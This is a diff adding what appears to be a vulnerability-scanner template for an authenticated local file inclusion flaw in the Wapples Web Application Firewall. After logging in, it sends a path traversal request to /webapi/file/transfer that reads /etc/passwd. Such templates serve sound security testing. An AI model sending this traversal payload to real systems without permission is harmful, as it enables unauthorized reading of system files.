@@ -1,0 +1,27 @@
+id: wapples-firewall-lfi
+brief:
+    title: Wapples Web Application Firewall - Local File Inclusion
+    by: For3stCo1d
+    level: high
+    about: Wapples Web Application Firewall is vulnerable to local file inclusion.
+    label:
+        - wapples
+        - firewall
+        - lfi
+        - authenticated
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/webapi/auth'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: id={{username}}&password={{password}}
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs: []
